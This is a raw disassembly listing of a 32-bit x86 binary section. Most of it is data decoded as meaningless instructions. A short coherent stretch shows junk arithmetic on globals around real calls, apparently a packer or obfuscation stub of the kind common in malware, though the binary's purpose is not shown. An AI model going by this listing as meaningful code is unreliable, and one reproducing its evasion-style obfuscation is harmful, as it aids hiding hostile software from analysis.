  403021:	scas   eax,DWORD PTR es:[edi]
  403022:	loopne 0x40305b
  403024:	xchg   BYTE PTR [eax+0x27859a64],ch
  40302a:	pop    ecx
  40302b:	scas   eax,DWORD PTR es:[edi]
  40302c:	sbb    BYTE PTR [ebx-0x28e0b458],al
  403032:	mov    edx,DWORD PTR [ebx+esi*1+0x8deea39]
  403039:	mov    edx,0xe90b262d
  40303e:	addr16 mov cl,0xbc
  403041:	and    BYTE PTR [eax],ch
  403043:	(bad)  
  403044:	hlt    
  403045:	push   eax
  403046:	shl    BYTE PTR [edi+0x5c8fea3],0x21
  40304d:	outs   dx,DWORD PTR ds:[esi]
  40304e:	jle    0x403072
  403050:	test   BYTE PTR [ecx],dh
  403052:	outs   dx,BYTE PTR ds:[esi]
  403053:	ins    DWORD PTR es:[edi],dx
  403054:	in     eax,0x73
  403056:	(bad)  
  403057:	ins    DWORD PTR es:[edi],dx
  403058:	jns    0x403065
  40305a:	fdiv   QWORD PTR [edi]
  40305c:	or     al,0xd4
  40305e:	scas   al,BYTE PTR es:[edi]
  40305f:	sbb    ax,0x9722
  403063:	jmp    0x9839:0x8e1c4c90
  40306a:	jae    0x40301f
  40306c:	sub    al,0xad
  40306e:	cmp    al,0x64
  403070:	add    eax,0x95cce76e
  403075:	push   edx
  403077:	dec    ebp
  403078:	mov    ebp,DWORD PTR ds:0xb6c1c139
  40307e:	sub    al,0xc7
  403080:	aam    0x19
  403082:	dec    edx
  403083:	mov    esi,0x8e034250
  403088:	mov    DWORD PTR [esi+0x43a18447],ebp
  40308e:	iret   
  40308f:	loopne 0x40307a
  403091:	and    eax,0x86528935
  403096:	add    BYTE PTR [esi+0x67152e5c],bl
  40309c:	into   
  40309d:	add    al,0xa6
  40309f:	xchg   esi,eax
  4030a0:	std    
  4030a1:	xchg   BYTE PTR [esi+0x18ee9e70],ah
  4030a7:	pop    ebp
  4030a8:	push   ebp
  4030a9:	mov    bl,cl
  4030ab:	add    ebx,DWORD PTR [eax+ebx*1+0x74]
  4030af:	jnp    0x4030a0
  4030b1:	jns    0x403116
  4030b3:	sub    dl,BYTE PTR [edx+0x23cb5bed]
  4030b9:	(bad)  
  4030ba:	rcr    DWORD PTR [eax+0x48d1a9ed],cl
  4030c0:	rol    BYTE PTR [edi],cl
  4030c2:	aad    0x6
  4030c4:	adc    ecx,edi
  4030c6:	sub    ebx,DWORD PTR [ebx]
  4030c8:	xchg   DWORD PTR [ebx],esp
  4030ca:	jo     0xf9ac4d2d
  4030d0:	pop    esp
  4030d1:	mov    bl,0xeb
  4030d3:	push   edx
  4030d4:	fwait
  4030d5:	lods   eax,DWORD PTR ds:[esi]
  4030d6:	and    BYTE PTR [edi+0x175c5f3],ah
  4030dc:	loop   0x40313d
  4030de:	cmp    DWORD PTR [ebp+0x40],ebp
  4030e1:	call   0xa629af2d
  4030e6:	sahf   
  4030e7:	sub    DWORD PTR [bp-0x63],0xdb487630
  4030ef:	jne    0x4030fe
  4030f1:	daa    
  4030f2:	mov    edi,0x8fa0948e
  4030f7:	mov    edi,cs
  4030f9:	test   DWORD PTR [ebp-0x7e],esp
  4030fc:	loop   0x40308f
  4030fe:	les    eax,FWORD PTR [ecx+esi*8-0x9]
  403102:	jno    0x40313b
  403104:	cmp    al,0xa6
  403106:	mov    esi,0x78f7702a
  40310b:	push   ecx
  40310c:	cmc    
  40310d:	mov    dl,0xfe
  40310f:	adc    BYTE PTR [edi],0x27
  403112:	mov    esp,0xadc67cb
  403117:	stc    
  403118:	out    dx,eax
  403119:	cwde   
  40311a:	pop    esp
  40311b:	cmc    
  40311c:	test   edi,ecx
  40311e:	and    DWORD PTR [ecx],esi
  403120:	dec    ecx
  403121:	jp     0x4030ef
  403123:	cmp    BYTE PTR [ecx-0x25],dl
  403126:	dec    esp
  403127:	loop   0x403143
  403129:	mov    ebx,0xb0f014dd
  40312e:	into   
  40312f:	adc    dh,dl
  403131:	mov    edx,edx
  403133:	addr16 rol edi,1
  403136:	fisubr DWORD PTR [esp]
  403139:	pop    ebx
  40313a:	(bad)  
  40313c:	shr    BYTE PTR [eax-0x4b],cl
  40313f:	mov    al,0xa8
  403141:	imul   ebp,DWORD PTR [esi+0x3ff2fc42],0x977f5a67
  40314b:	fcomp  DWORD PTR [edx-0x13]
  40314e:	lods   al,BYTE PTR ds:[esi]
  40314f:	xchg   BYTE PTR [edx+0xa4a3f78],dh
  403155:	mov    bh,0xb4
  403157:	ins    DWORD PTR es:[edi],dx
  403158:	pusha  
  403159:	mov    cl,0xcb
  40315b:	sti    
  40315c:	(bad)  
  40315d:	cld    
  40315e:	repnz cmp BYTE PTR [ebx-0x6c],0xe1
  403163:	inc    eax
  403164:	pop    esp
  403165:	sbb    BYTE PTR [eax-0x377faf3a],0x6
  40316c:	imul   esi,DWORD PTR [edx-0x42],0x57787109
  403173:	lock inc edi
  403175:	jno    0x4031d6
  403177:	repz or BYTE PTR ds:0xdf1dbfcd,cl
  40317e:	je     0x403105
  403180:	mov    ah,0x3b
  403182:	xchg   ebp,eax
  403183:	jno    0x40311b
  403185:	push   ss
  403186:	aaa    
  403187:	mov    ah,0xb2
  403189:	test   DWORD PTR [ebx+0x31],0x30278495
  403190:	mov    ebx,0xecbcb65c
  403195:	and    eax,DWORD PTR ds:0xbff0110d
  40319b:	jbe    0x403145
  40319d:	(bad)  [esi]
  40319f:	pop    edx
  4031a0:	stc    
  4031a1:	mov    ds,WORD PTR [ebx+0x77a512d]
  4031a7:	lahf   
  4031a8:	xchg   DWORD PTR [ebx],edx
  4031aa:	jne    0x403169
  4031ac:	icebp  
  4031ad:	jmp    0x68ca5f2e
  4031b2:	ins    DWORD PTR es:[edi],dx
  4031b3:	dec    ebp
  4031b4:	(bad)  
  4031b5:	mov    esi,0x96c64b60
  4031ba:	loopne 0x4031be
  4031bc:	inc    ebx
  4031bd:	out    0xd2,eax
  4031bf:	pop    edx
  4031c0:	rcl    DWORD PTR [ebx+0x4186913],cl
  4031c6:	retf   
  4031c7:	and    DWORD PTR [eax],ebx
  4031c9:	mov    cl,0x42
  4031cb:	mov    ds:0xbdcb831c,eax
  4031d0:	(bad)  
  4031d1:	mov    eax,0x12935f99
  4031d6:	cld    
  4031d7:	stc    
  4031d8:	cwde   
  4031d9:	mov    eax,0x56b4da6f
  4031de:	push   ebp
  4031df:	jne    0x403231
  4031e1:	fiadd  WORD PTR [ebx+0x14]
  4031e4:	retf   
  4031e5:	cmp    bh,BYTE PTR [edi-0x13]
  4031e8:	and    al,ch
  4031ea:	rcr    ebx,0xc
  4031ed:	mov    bh,0xe
  4031ef:	aas    
  4031f0:	mov    ch,0xe6
  4031f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031f3:	add    ch,BYTE PTR [edx-0x12]
  4031f6:	fmulp  st(4),st
  4031f8:	stc    
  4031f9:	push   cs
  4031fa:	les    esp,FWORD PTR [ebx+0x7e3035ba]
  403200:	out    dx,al
  403201:	and    edx,ebx
  403203:	mov    ds:0x57d64c7a,al
  403208:	or     eax,0xb1337934
  40320d:	gs xchg ebx,eax
  40320f:	es sbb dl,BYTE PTR es:[eax-0x4c]
  403214:	and    dl,BYTE PTR [ebp+eax*1+0x66]
  403218:	daa    
  403219:	jg     0x403224
  40321b:	inc    ebx
  40321c:	aam    0x7f
  40321e:	popf   
  40321f:	mov    eax,ds:0x4282a788
  403224:	daa    
  403225:	inc    edx
  403226:	fucom  st(0)
  403228:	rol    DWORD PTR [eax+0x71af2aac],0xb4
  40322f:	arpl   bp,cx
  403231:	in     eax,0xe6
  403233:	imul   edi,DWORD PTR [esi],0xb395afe4
  403239:	mov    eax,ds:0x3c146599
  40323e:	aam    0x4b
  403240:	pop    ss
  403241:	push   edi
  403242:	inc    ebp
  403243:	aad    0xe
  403245:	call   0x3867:0xc1b92ca9
  40324c:	mov    esp,0xd1b74b4c
  403251:	push   ebx
  403252:	pop    edi
  403253:	repz push ebx
  403255:	dec    ecx
  403256:	test   eax,0x80d5e959
  40325b:	mov    al,ds:0xef4ef1d6
  403260:	and    eax,esi
  403262:	in     al,dx
  403263:	xor    BYTE PTR [ebx-0xf],cl
  403266:	push   esi
  403267:	pushf  
  403268:	test   eax,0xddfa5aea
  40326d:	cwde   
  40326e:	loopne 0x40326e
  403270:	fidivr WORD PTR [edx+0x6e]
  403273:	push   es
  403274:	int    0x34
  403276:	fmul   DWORD PTR [edi-0x796efb8]
  40327c:	push   ebp
  40327d:	mov    esp,0xca1fe0e0
  403282:	jnp    0x403284
  403284:	push   edi
  403285:	and    ebp,DWORD PTR [ebp-0x7c]
  403288:	fnstcw WORD PTR [esi-0x664bb6f5]
  40328e:	mov    esi,0x9e140551
  403293:	push   es
  403294:	int3   
  403295:	fdiv   QWORD PTR [ebp+edi*1+0x255fc268]
  40329c:	test   al,0x75
  40329e:	add    DWORD PTR [edi+0x186f42ac],esp
  4032a4:	push   ecx
  4032a5:	arpl   WORD PTR [ebp+0x5e],bp
  4032a8:	loopne 0x403255
  4032aa:	push   esp
  4032ab:	mov    al,0x4f
  4032ad:	jbe    0x403235
  4032af:	pop    ecx
  4032b0:	test   al,0xde
  4032b2:	and    edx,DWORD PTR [edx+0xd790b26]
  4032b8:	xchg   ebx,eax
  4032b9:	imul   BYTE PTR [esi+0x60f6ac49]
  4032bf:	xor    al,0xa4
  4032c1:	sub    DWORD PTR [edi+eiz*1],esi
  4032c4:	add    al,0xa1
  4032c6:	loop   0x40324a
  4032c8:	imul   ebp,DWORD PTR [ecx-0x1e],0x3c
  4032cc:	fs mov ecx,0x3bbcb6d1
  4032d2:	in     eax,dx
  4032d3:	add    esi,DWORD PTR [edx-0x3c66b138]
  4032d9:	lahf   
  4032da:	ss pop ebx
  4032dc:	aam    0x33
  4032de:	xor    edx,DWORD PTR [ecx+ebx*2]
  4032e1:	pop    ss
  4032e2:	xor    al,0xd8
  4032e4:	sbb    eax,0x47cb7781
  4032e9:	sbb    al,al
  4032eb:	pop    edi
  4032ec:	jns    0x403333
  4032ee:	into   
  4032ef:	or     eax,DWORD PTR [ebp+0x48]
  4032f2:	pusha  
  4032f3:	scas   eax,DWORD PTR es:[edi]
  4032f4:	cmp    cl,0x62
  4032f7:	lock push edx
  4032f9:	outs   dx,DWORD PTR ds:[esi]
  4032fa:	lods   eax,DWORD PTR ds:[esi]
  4032fb:	jg     0x4032cd
  4032fd:	push   ebx
  4032fe:	mov    al,cl
  403300:	out    0xdd,eax
  403302:	push   ss
  403303:	and    eax,0x82a6789b
  403308:	out    0xe3,al
  40330a:	popf   
  40330b:	push   ebx
  40330c:	mov    al,0xee
  40330e:	or     DWORD PTR [edi],edx
  403310:	push   ebp
  403311:	mov    eax,ds:0xb1636488
  403316:	push   esi
  403317:	cli    
  403318:	fcom   DWORD PTR ds:0x51900077
  40331e:	rcr    BYTE PTR [edx*2-0x29419137],0x6f
  403326:	sar    BYTE PTR [edx-0x52],1
  403329:	rol    ebx,cl
  40332b:	and    bh,bl
  40332d:	inc    ebx
  40332e:	inc    esp
  40332f:	fcmovnu st,st(1)
  403331:	nop
  403332:	dec    esi
  403333:	test   eax,0x62c76088
  403338:	pushf  
  403339:	aam    0x9a
  40333b:	and    cl,BYTE PTR [ebx+eax*8]
  40333e:	mov    BYTE PTR [esi-0x7c],al
  403341:	mov    dl,0x3
  403343:	cdq    
  403344:	mov    ebp,0xe89f21c9
  403349:	adc    BYTE PTR [eax],ch
  40334b:	or     DWORD PTR [ebx],edi
  40334d:	mov    cl,0x7a
  40334f:	jg     0x403301
  403351:	xor    edx,edi
  403353:	std    
  403354:	test   eax,0xae55adaa
  403359:	jmp    0x47f4cac0
  40335e:	fstp   st(1)
  403360:	jno    0x403357
  403362:	xchg   esp,eax
  403363:	xor    eax,0xf4dd5a1a
  403368:	mov    al,ds:0x4145b1e5
  40336d:	lock push esp
  40336f:	inc    esi
  403370:	dec    edi
  403371:	sahf   
  403372:	xor    BYTE PTR [ecx],ah
  403374:	sub    al,0x10
  403376:	mov    ebp,0x62e3b6cc
  40337b:	aas    
  40337c:	mov    ?,edi
  40337e:	sub    DWORD PTR [edx],edx
  403380:	repnz and al,0x13
  403383:	mov    BYTE PTR [ecx-0x10],bl
  403386:	cdq    
  403387:	les    eax,FWORD PTR [ebp-0x46c8e37e]
  40338d:	imul   BYTE PTR [edx-0x50]
  403390:	or     ebp,edx
  403392:	xchg   ebx,eax
  403393:	mov    bl,0x9
  403395:	test   eax,0x54b8eadc
  40339a:	cdq    
  40339b:	jae    0x40331d
  40339d:	mov    eax,ds:0x6a52493b
  4033a2:	push   ecx
  4033a3:	xchg   esi,eax
  4033a4:	pop    ds
  4033a5:	fadd   QWORD PTR [eax-0x25]
  4033a8:	jmp    0xb33a:0x7a6f3634
  4033af:	cmc    
  4033b0:	arpl   WORD PTR [ebx],ax
  4033b2:	je     0x403412
  4033b4:	aam    0xb3
  4033b6:	loopne 0x403343
  4033b8:	push   ds
  4033b9:	xor    al,0x24
  4033bb:	pushf  
  4033bc:	shl    DWORD PTR [ebx+0xec30f09],1
  4033c2:	iret   
  4033c3:	pop    ebp
  4033c4:	shl    ebp,0x59
  4033c7:	js     0x40336d
  4033c9:	or     eax,0x79b877e2
  4033ce:	xchg   ecx,eax
  4033cf:	in     al,0xc1
  4033d1:	mov    ecx,0xa6e1872
  4033d6:	fsub   QWORD PTR [edi+0x58]
  4033d9:	fldenv [ebp-0x9]
  4033dc:	cli    
  4033dd:	inc    ebp
  4033de:	adc    DWORD PTR [ebx+0x51c2135f],esi
  4033e4:	stc    
  4033e5:	jecxz  0x403457
  4033e7:	mov    dh,0x26
  4033e9:	sub    bh,BYTE PTR [ebp-0x68]
  4033ec:	xor    al,bh
  4033ee:	push   eax
  4033ef:	jg     0x403382
  4033f1:	(bad)  
  4033f2:	aam    0x7b
  4033f4:	mov    ecx,0x718be39a
  4033f9:	xchg   ebx,eax
  4033fa:	aad    0xf8
  4033fc:	adc    al,0x8c
  4033fe:	loope  0x403396
  403400:	js     0x4033b5
  403402:	nop
  403403:	push   ebp
  403404:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403405:	mov    ebx,0xc1b43ea6
  40340a:	adc    BYTE PTR [ebx-0x3d1a3f2a],al
  403410:	test   al,0xba
  403412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403413:	jbe    0x4033f7
  403415:	arpl   sp,sp
  403417:	mov    ah,0x2c
  403419:	ds js  0x4033fa
  40341c:	mov    ebx,0x2b89f79c
  403421:	pop    esp
  403422:	jge    0x4033f3
  403424:	mov    ch,0x72
  403426:	xchg   DWORD PTR [ebp-0x7e01cb8a],ebp
  40342c:	test   BYTE PTR [esp+edi*4+0x68220fa8],cl
  403433:	sbb    ecx,esp
  403435:	jge    0x4033d7
  403437:	push   cs
  403438:	jp     0x403403
  40343a:	dec    esi
  40343b:	sbb    bl,BYTE PTR [edx-0xc]
  40343e:	ins    DWORD PTR es:[edi],dx
  40343f:	dec    edi
  403440:	clc    
  403441:	idiv   DWORD PTR [ebp-0x7d]
  403444:	sbb    DWORD PTR [edi-0x407167d],esp
  40344a:	test   BYTE PTR [edx],0x8c
  40344d:	mov    edi,cs
  40344f:	mov    esi,0xe5751b5f
  403454:	ja     0x4034ac
  403456:	fisttp WORD PTR [eax+ebp*8+0x16]
  40345a:	test   DWORD PTR [eax-0x7ad63bc8],ebp
  403460:	push   ebx
  403461:	mov    ecx,0x29cbe127
  403466:	sub    eax,0xcae15d3
  40346b:	mov    ah,0x3b
  40346d:	jne    0x40347f
  40346f:	loop   0x4033ff
  403471:	pop    ecx
  403472:	mov    dh,0x26
  403474:	dec    ebx
  403475:	fld    st(4)
  403477:	gs leave 
  403479:	adc    edx,DWORD PTR [esi]
  40347b:	arpl   WORD PTR [eax],ax
  40347d:	fld    TBYTE PTR [eax]
  40347f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403480:	jmp    0xb3c76ffb
  403485:	or     al,0x6f
  403487:	add    DWORD PTR [edi+0x3c],edx
  40348a:	xchg   edx,eax
  40348b:	adc    al,0x11
  40348d:	call   0x152ce22a
  403492:	cmp    dl,dl
  403494:	hlt    
  403495:	(bad)  
  403496:	into   
  403497:	inc    eax
  403498:	nop
  403499:	push   cs
  40349a:	and    eax,0x74898f8b
  40349f:	pusha  
  4034a0:	inc    ecx
  4034a1:	adc    edi,DWORD PTR [ebp-0x6c1e4e20]
  4034a7:	pop    ebx
  4034a8:	or     dh,cl
  4034aa:	test   al,0x55
  4034ac:	bound  edx,QWORD PTR [edx+edi*2+0x0]
  4034b0:	push   esp
  4034b1:	ret    0x7487
  4034b4:	sti    
  4034b5:	fidivr WORD PTR [eax]
  4034b7:	fs jle 0x40350c
  4034ba:	jmp    0xbeccd992
  4034bf:	push   ss
  4034c0:	retf   0x9d81
  4034c3:	adc    BYTE PTR fs:[eax+0x1c],dl
  4034c7:	cmp    eax,0xe58b8bb
  4034cc:	cmp    ebx,ebx
  4034ce:	stos   BYTE PTR es:[edi],al
  4034cf:	ja     0x403456
  4034d1:	adc    cl,cl
  4034d3:	out    dx,eax
  4034d4:	xchg   esi,eax
  4034d5:	xchg   esp,eax
  4034d6:	or     DWORD PTR [edx-0x6491baf6],0x23
  4034dd:	sbb    al,0x56
  4034df:	jo     0x403464
  4034e1:	jle    0x40351c
  4034e3:	adc    al,0x75
  4034e5:	in     al,0x68
  4034e7:	cs je  0x40350f
  4034ea:	cli    
  4034eb:	loope  0x40354b
  4034ed:	add    al,0xd3
  4034ef:	in     al,0xe
  4034f1:	test   dh,bh
  4034f3:	xor    BYTE PTR [edi],ah
  4034f5:	scas   al,BYTE PTR es:[edi]
  4034f6:	popf   
  4034f7:	cmp    DWORD PTR [edi],ebp
  4034f9:	mov    cl,0x43
  4034fb:	adc    edx,ebx
  4034fd:	fldenv [edx+0x50]
  403500:	test   al,0x65
  403502:	cmp    ecx,ecx
  403504:	cli    
  403505:	shl    BYTE PTR [esi-0x72],cl
  403508:	pop    eax
  403509:	fisttp WORD PTR [ebx-0x26bee972]
  40350f:	mov    eax,0x33cab65e
  403514:	cmp    BYTE PTR [ebx+0x2571afaa],0x69
  40351b:	daa    
  40351c:	call   0xe74ed40c
  403521:	(bad)  
  403522:	(bad)  
  403523:	out    0x54,al
  403525:	adc    bx,bx
  403528:	inc    ebp
  403529:	leave  
  40352a:	dec    ecx
  40352b:	cld    
  40352c:	rcr    BYTE PTR [esi],1
  40352e:	mov    edi,0x3aaeaffb
  403533:	push   esi
  403534:	adc    DWORD PTR [ebx],esp
  403536:	fidiv  DWORD PTR [ecx+0x61]
  403539:	jge    0x40352f
  40353b:	rcr    BYTE PTR [edx+ebp*4-0x40],cl
  40353f:	add    ebp,DWORD PTR [eax]
  403541:	jmp    0x403555
  403543:	add    DWORD PTR [edi],ebx
  403545:	cdq    
  403546:	xchg   edi,eax
  403547:	in     al,0x60
  403549:	mov    al,ds:0x7f1655db
  40354e:	js     0x4034f5
  403550:	cmp    esp,DWORD PTR [ebp+eax*2+0x2b8a5fc2]
  403557:	mov    bh,0x1e
  403559:	fmul   DWORD PTR [esi+0x58b94ea0]
  40355f:	jbe    0x403562
  403561:	cld    
  403562:	dec    esp
  403563:	mov    BYTE PTR [edi-0x7f031936],bh
  403569:	ret    0x19f3
  40356c:	mov    esi,0xf315a63c
  403571:	sub    DWORD PTR [esi-0x5538b052],0x705e2178
  40357b:	cmp    eax,0x4a5c362
  403580:	in     eax,dx
  403581:	call   0xc1f4:0x1385f8b9
  403588:	in     eax,dx
  403589:	add    al,0x55
  40358b:	test   ch,al
  40358d:	fist   WORD PTR [ecx+0x229f08db]
  403593:	lods   al,BYTE PTR ds:[esi]
  403594:	arpl   WORD PTR [eax-0x4],bx
  403597:	outs   dx,BYTE PTR ds:[esi]
  403598:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403599:	test   al,0x1c
  40359b:	xchg   BYTE PTR [esp+edx*4-0x60179cb],al
  4035a2:	mov    cl,0xa6
  4035a4:	mov    esi,0x9b285945
  4035a9:	shl    dl,0x4d
  4035ac:	xchg   esp,eax
  4035ad:	push   edx
  4035ae:	enter  0x4a3b,0xa6
  4035b2:	sti    
  4035b3:	stc    
  4035b4:	jnp    0x403614
  4035b6:	sub    eax,0xb1d048c0
  4035bb:	sub    BYTE PTR gs:0xbb4d0881,dl
  4035c2:	test   al,0xd7
  4035c4:	ins    DWORD PTR es:[edi],dx
  4035c5:	sbb    ebx,ebp
  4035c7:	xchg   ebx,eax
  4035c8:	mov    dh,0x24
  4035ca:	ds dec eax
  4035cc:	jp     0x4035d5
  4035ce:	mov    ecx,0x52e0019a
  4035d3:	or     eax,0xdce80e21
  4035d8:	inc    ebp
  4035d9:	xor    ebp,DWORD PTR [ebx]
  4035db:	add    DWORD PTR [esp+esi*4+0x3d],0xffffffe1
  4035e0:	or     eax,0xab9389dd
  4035e5:	xor    ch,dh
  4035e7:	test   DWORD PTR [edi-0x3863684e],0x6c12f3c7
  4035f1:	sbb    dl,0x68
  4035f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035f5:	cmc    
  4035f6:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  403600:	mov    eax,ds:0x42a27e
  403605:	or     DWORD PTR ds:0x42a27a,eax
  40360b:	mov    eax,DWORD PTR [ebp-0x14]
  40360e:	mov    DWORD PTR [ebp-0x9c],eax
  403614:	adc    DWORD PTR ds:0x42a29a,ecx
  40361a:	mov    eax,DWORD PTR [ebp-0x18]
  40361d:	mov    DWORD PTR [ebp-0x98],eax
  403623:	sbb    DWORD PTR ds:0x42a28a,0x5122
  40362d:	mov    eax,DWORD PTR [ebp-0x2c]
  403630:	xor    eax,esi
  403632:	add    eax,edi
  403634:	or     DWORD PTR ds:0x42a27a,0x42a2ea
  40363e:	mov    DWORD PTR [ebp-0x94],eax
  403644:	lea    eax,[ebp-0x48]
  403647:	mov    DWORD PTR [ebp-0x90],eax
  40364d:	mov    eax,DWORD PTR [ebp-0xa0]
  403653:	xor    eax,esi
  403655:	sbb    DWORD PTR ds:0x42a2f2,0x42a2da
  40365f:	add    eax,edi
  403661:	or     DWORD PTR ds:0x42a2ee,0x42a256
  40366b:	mov    DWORD PTR [ebp-0xa0],eax
  403671:	sub    DWORD PTR ds:0x42a272,0x1d49
  40367b:	lea    eax,[ebp-0xa0]
  403681:	push   eax
  403682:	neg    eax
  403684:	mov    eax,DWORD PTR [ebp+0xc]
  403687:	sub    DWORD PTR ds:0x42a2aa,0x2c11
  403691:	xor    eax,esi
  403693:	add    eax,edi
  403695:	push   eax
  403696:	mov    eax,ds:0x42943e
  40369b:	push   0x429394
  4036a0:	mov    DWORD PTR ds:0x42a286,0x524d
  4036aa:	push   DWORD PTR [eax]
  4036ac:	call   0x4084f6
  4036b1:	xor    edx,edx
  4036b3:	add    edx,DWORD PTR ds:0x42a29e
  4036b9:	and    DWORD PTR ds:0x42a28e,edx
  4036bf:	mov    ebx,DWORD PTR [ebp-0x14]
  4036c2:	mov    eax,DWORD PTR [ebp-0x18]
  4036c5:	mov    DWORD PTR [ebp-0x58],eax
  4036c8:	mov    eax,ds:0x42a306
  4036cd:	mov    edx,DWORD PTR ds:0x42a34e
  4036d3:	sub    edx,eax
  4036d5:	sub    eax,DWORD PTR [eax+edx*1]
  4036d8:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  4036df:	mov    eax,0xf89c85bb
  4036e4:	mov    DWORD PTR [ebp-0x1c],eax
  4036e7:	xor    DWORD PTR ds:0x42a286,0x37ec
  4036f1:	lea    ecx,[eax-0x16]
  4036f4:	and    DWORD PTR ds:0x42a2e2,0x0
  4036fe:	jmp    0x403710
  403703:	mov    edx,DWORD PTR ds:0x42a2e2
  403709:	inc    edx
  40370a:	mov    DWORD PTR ds:0x42a2e2,edx
  403710:	cmp    DWORD PTR ds:0x42a2e2,0x18
  403717:	jae    0x40376b
  40371d:	cmp    DWORD PTR ds:0x42a2e2,0x4
  403724:	jl     0x40376b
  40372a:	jmp    0x40374c
  40372f:	push   DWORD PTR [ebp-0x20]
  403732:	push   DWORD PTR [ebp-0x18]
  403735:	push   DWORD PTR [ebp-0x20]
  403738:	push   DWORD PTR [ebp-0x18]
  40373b:	push   DWORD PTR [ebp-0x14]
  40373e:	push   DWORD PTR [ebp-0x20]
  403741:	push   0x429247
  403746:	call   DWORD PTR ds:0x42a3d6
  40374c:	cmp    DWORD PTR ds:0x42a2e2,0x3
  403753:	jne    0x403766
  403759:	mov    edx,DWORD PTR ds:0x42a2e2
  40375f:	inc    edx
  403760:	mov    DWORD PTR ds:0x42a2e2,edx
  403766:	jmp    0x403703
  40376b:	mov    DWORD PTR [ebp-0x28],ecx
  40376e:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  403775:	neg    DWORD PTR ds:0x42a25e
  40377b:	mov    DWORD PTR [ebp-0x8],eax
  40377e:	xor    edx,edx
  403780:	or     edx,DWORD PTR ds:0x42a2da
  403786:	xor    DWORD PTR ds:0x42a29a,edx
  40378c:	mov    eax,DWORD PTR [ebp-0x10]
  40378f:	neg    edx
  403791:	xor    eax,esi
  403793:	mov    edx,0xffcd8d8f
  403798:	sub    edx,eax
  40379a:	mov    eax,ds:0x42a2fe
  40379f:	mov    DWORD PTR [ebp-0xc],edx
  4037a2:	mov    DWORD PTR [ebp-0x18],0xf89c85be
  4037a9:	mov    eax,DWORD PTR [ebp-0x8]
  4037ac:	mov    DWORD PTR ds:0x42a2ce,0x6d9f
  4037b6:	mov    DWORD PTR [ebp-0x3c],ebx
  4037b9:	mov    DWORD PTR ds:0x42a286,0xb52
  4037c3:	cmp    eax,ecx
  4037c5:	mov    DWORD PTR ds:0x42a2d2,0x1900
  4037cf:	je     0x408220
  4037d5:	xor    DWORD PTR ds:0x42a2b6,edx
  4037db:	mov    eax,DWORD PTR [ebp-0x10]
  4037de:	jmp    0x405b37
  4037e3:	or     al,BYTE PTR es:[edx-0x17]
  4037e7:	inc    edx
  4037e8:	mov    eax,ds:0x1d8d8286
  4037ed:	ins    DWORD PTR es:[edi],dx
  4037ee:	mov    al,ds:0xd1a3f43d
  4037f3:	inc    edi
  4037f4:	pop    esi
  4037f5:	add    DWORD PTR [ebx-0x7c7ca1b9],0x72
  4037fc:	fcomp  DWORD PTR [ebx+0x2d]
  4037ff:	popf   
  403800:	mov    eax,0x9a323613
  403805:	fist   WORD PTR ds:0x59b10fb2
  40380b:	sbb    ecx,edi
  40380d:	mov    es:0xe148c1c5,eax
  403813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403814:	xchg   ebx,eax
  403815:	mov    edx,0x18499845
  40381a:	fmul   QWORD PTR [ecx]
  40381c:	out    0xa4,al
  40381e:	sub    esi,ebx
  403820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403821:	or     dl,al
  403823:	sub    eax,0x1a904f3b
  403828:	addr16 or al,0xa4
  40382b:	test   DWORD PTR [eax],0xa48ae9d6
  403831:	mov    edx,0xebec6cdb
  403836:	xor    ebp,DWORD PTR [edx-0x16eaefb]
  40383c:	mov    ah,0xb9
  40383e:	adc    eax,DWORD PTR [edi+edx*2-0x38e5df5c]
  403845:	mov    esp,0x9a0f819b
  40384a:	inc    eax
  40384b:	xchg   ebx,eax
  40384c:	out    dx,eax
  40384d:	fistp  WORD PTR [eax-0x55a49a59]
  403853:	add    ch,BYTE PTR [edi-0x34b9e6c6]
  403859:	xchg   DWORD PTR [eax+edi*4-0x6a],esp
  40385d:	ds mov ebp,0x284b14fa
  403863:	push   ebx
  403864:	sub    eax,0xa7401f7a
  403869:	jg     0x403882
  40386b:	xor    al,0x50
  40386d:	inc    edi
  40386e:	iret   
  40386f:	lea    edi,[esi+0x1a8d93a]
  403875:	les    ecx,FWORD PTR [edx-0x4f]
  403878:	clc    
  403879:	shr    DWORD PTR [esi+0xdd44743],cl
  40387f:	iret   
  403880:	jo     0x40383e
  403882:	add    cl,BYTE PTR [ecx]
  403884:	add    BYTE PTR [ebp+0x2daae98b],dh
  40388a:	push   ebx
  40388b:	xchg   edi,eax
  40388c:	sbb    DWORD PTR [esi+0x27],ecx
  40388f:	retf   0x92b9
  403892:	sbb    eax,0xc65bca95
  403897:	mov    al,ds:0xebd120c3
  40389c:	call   0xf0a8b5b6
  4038a1:	push   ebp
  4038a2:	adc    DWORD PTR [edi],edi
  4038a4:	lahf   
  4038a5:	pop    esi
  4038a6:	xchg   esp,eax
  4038a7:	jae    0x4038b1
  4038a9:	mov    dh,0x24
  4038ab:	sub    bl,BYTE PTR [edi]
  4038ad:	sub    DWORD PTR [ebx],0xffffffa9
  4038b0:	cmp    eax,0x23204c19
  4038b5:	push   0xc614b1d
  4038ba:	add    eax,DWORD PTR [eax-0x38]
  4038bd:	pop    ss
  4038be:	xor    BYTE PTR [ebx+0x789c72b9],ch
  4038c4:	data16 loope 0x4038cf
  4038c7:	mov    dh,0xc1
  4038c9:	dec    edi
  4038ca:	jbe    0x4038cc
  4038cc:	sub    BYTE PTR [ebx+0x4de3bb26],dl
  4038d2:	int    0xd0
  4038d4:	mov    edx,esi
  4038d6:	scas   eax,DWORD PTR es:[edi]
  4038d7:	fld    DWORD PTR [esi]
  4038d9:	push   ds
  4038da:	mov    al,0x97
  4038dc:	sbb    al,0x3f
  4038de:	or     dl,BYTE PTR ss:[esi]
  4038e1:	and    BYTE PTR [ebx+0x0],ch
  4038e4:	mov    dh,0xcf
  4038e6:	repz jmp 0x47294e2f
  4038ec:	dec    edx
  4038ed:	or     dl,0xb
  4038f0:	rcr    DWORD PTR [ecx-0x293082d2],1
  4038f6:	icebp  
  4038f7:	pop    es
